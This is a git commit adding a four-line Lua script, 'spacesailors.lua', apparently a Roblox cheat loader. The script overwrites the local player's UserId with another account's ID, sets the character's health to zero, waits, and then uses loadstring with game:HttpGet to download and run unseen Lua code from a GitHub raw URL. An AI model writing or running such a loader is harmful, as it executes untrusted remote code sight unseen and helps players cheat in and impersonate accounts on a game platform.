5b5447c584248dd82e043ae51cf6b69a2f573678
HackerTheBestYTB <56880221+HackerTheBestYTB@users.noreply.github.com>
2022-08-18 18:36:12 +0700

    Create spacesailors.lua

---
+++ spacesailors.lua
@@ -0,0 +1,4 @@
+game.Players.LocalPlayer.UserId                    = "30683604"
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+wait(7.5)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/loaadeer.lua')))()
